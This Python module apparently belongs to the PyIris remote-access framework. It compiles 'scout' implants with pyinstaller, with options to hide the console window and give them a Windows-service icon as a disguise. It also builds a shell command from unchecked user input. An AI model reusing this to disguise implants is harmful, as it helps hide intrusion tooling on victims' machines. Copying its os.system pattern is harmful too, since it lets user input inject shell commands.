# WEB + COM
# done
import os
import ntpath
import shutil
import library.modules.config as config
config.main()
interface = config.interface
if interface == "GUI":
    from flask import jsonify


def main(path, prompt = None):
    if os.name == 'nt':
        filename = ntpath.basename(path)[:-3] + '.exe'
    else:
        filename = ntpath.basename(path)[:-3]
    if interface == "GUI":
        config.app.logger.info("[library/modules/compiler] - Initiating compilation of scout : " + path)
    elif interface == "CUI":
        print(config.inf + 'Initiating compilation of scout : ' + path)
    tags = []
    if interface == "GUI":
        if prompt['onefile']:
            tags.append("--onefile")
        if prompt['windowed']:
            tags.append('--windowed')
        if prompt['custom_icon']:
            if os.path.exists(prompt['custom_icon_filepath']):
                config.app.logger.info("[library/modules/compiler] - Custom .ico file found and loaded")
                tags.append('--icon ' + prompt['custom_icon_filepath'])
            else:
                config.app.logger.warning("[library/modules/compiler] - Custom .ico file not found")
                tags.append('--icon ' + os.path.join(os.getcwd(), 'resources', 'windows_service.ico'))
                config.app.logger.info("[library/modules/compiler] - Default .ico file used")
        else:
            tags.append('--icon ' + os.path.join(os.getcwd(), 'resources', 'windows_service.ico'))
            config.app.logger.info("[library/modules/compiler] - Default .ico file used")
    elif interface == "CUI":
        while True:
            option = input(config.pro + 'Compress compiled scout into one file? [y|n] : ')
            if option in ('y', 'Y', 'yes', 'Yes'):
                tags.append('--onefile')
                break
            elif option in ('n', 'N', 'No', 'no'):
                break
            else:
                continue
        while True:
            option = input(config.pro + 'Compile scout so that it runs without a window? [y|n] : ')
            if option in ('y', 'Y', 'yes', 'Yes'):
                tags.append('--windowed')
                break
            elif option in ('n', 'N', 'No', 'no'):
                break
            else:
                continue
        while True:
            option = input(config.pro + 'Use a custom file icon (.ico) for the compiled scout? [y|n] : ')
            if option in ('y', 'Y', 'yes', 'Yes'):
                option = input(
                    config.pro + 'Path to file ico or press [enter] to use the default PyIris provided windows service icon (resources/windows_service.ico) : ')
                if not option:
                    option = os.path.join(os.getcwd(), 'resources', 'windows_service.ico')
                tags.append('--icon ' + option)
                break
            elif option in ('n', 'N', 'No', 'no'):
                break
            else:
                continue
    command = 'pyinstaller ' + ' '.join(tags) + ' ' + path
    if interface == "GUI":
        config.app.logger.info("[library/modules/compiler] - Removing residue folders...")
    elif interface == "CUI":
        print(config.inf + 'Removing residue folders...')
    if os.path.isdir(os.path.join(os.getcwd(), 'build')):
        shutil.rmtree('build')
    if os.path.isdir(os.path.join(os.getcwd(), 'dist')):
        shutil.rmtree('dist')
    if not os.path.isdir(os.path.join(os.getcwd(), 'generated')):
        os.makedirs(os.path.join(os.getcwd(), 'generated'))
    for i in os.listdir(os.getcwd()):
        if i.endswith('.spec'):
            os.remove(i)
    if interface == "GUI":
        config.app.logger.info("[library/modules/compiler] - Compiling file...")
    elif interface == "CUI":
        print(config.inf + 'Compiling file...')
    os.system(command)
    if os.path.isdir(os.path.join(os.getcwd(), 'build')):
        shutil.rmtree('build')
    else:
        if interface == "GUI":
            config.app.logger.error("\x1b[1m\x1b[31m[library/modules/compiler] - Error, could not successfully compile scout (Is 'pyinstaller' installed and visible in your PATH?)\x1b[0m")
            return jsonify({"output": "Fail", "output_message": "Error, could not successfully compile scout (Is 'pyinstaller' installed and visible in your PATH?)", "data": ""})
        elif interface == "CUI":
            print(config.neg + 'Error, could not successfully compile scout (Is "pyinstaller" installed and visible in your PATH?)')
            return
    if os.path.isdir(os.path.join(os.getcwd(), 'dist', ntpath.basename(path)[:-3])):
        if os.path.isdir(os.path.join(os.getcwd(), 'generated', ntpath.basename(path)[:-3])):
            if interface == "GUI":
                config.app.logger.warning("[library/modules/compiler] - detected previous scout folder, deleting it to overwrite...")
            elif interface == "CUI":
                print(config.war + 'detected previous scout folder, deleting it to overwrite...')
            shutil.rmtree(os.path.join(os.getcwd(), 'generated', ntpath.basename(path)[:-3]))
        shutil.copytree(os.path.join(os.getcwd(), 'dist', ntpath.basename(path)[:-3]), os.path.join(os.getcwd(), 'generated', ntpath.basename(path)[:-3]))
        shutil.rmtree('dist')
        if interface == "GUI":
            config.app.logger.info("[library/modules/compiler] - Successfully compiled scout folder to : " + os.path.join(os.getcwd(), "generated", filename[:-4]))
        elif interface == "CUI":
            print(config.pos + 'Successfully compiled scout folder to : ' + os.path.join(os.getcwd(), 'generated', filename[:-4]))
    elif os.path.isdir(os.path.join(os.getcwd(), 'dist')):
        shutil.copy(os.path.join(os.getcwd(), 'dist', filename), os.path.join(os.getcwd(), 'generated', filename))
        shutil.rmtree('dist')
        if interface == "GUI":
            config.app.logger.info("[library/modules/compiler] - Successfully compiled single file scout to : " + os.path.join(os.getcwd(), "generated", filename))
        elif interface == "CUI":
            print(config.pos + 'Successfully compiled single file scout to : ' + os.path.join(os.getcwd(), 'generated', filename))
    else:
        if interface == "GUI":
            config.app.logger.error("\x1b[1m\x1b[31m[library/modules/compiler] - Error, could not successfully compile scout (Is 'pyinstaller' installed and visible in your PATH?)\x1b[0m")
            return jsonify({"output": "Fail", "output_message": "Error, could not successfully compile scout (Is 'pyinstaller' installed and visible in your PATH?)", "data": ""})
        elif interface == "CUI":
            print(config.neg + 'Error, could not successfully compile scout (Is "pyinstaller" installed and visible in your PATH?)')
            return
    for i in os.listdir(os.getcwd()):
        if i.endswith('.spec'):
            os.remove(i)
    if interface == "GUI":
        return jsonify({"output": "Success", "output_message": "Compilation and generation successful", "data": ""})
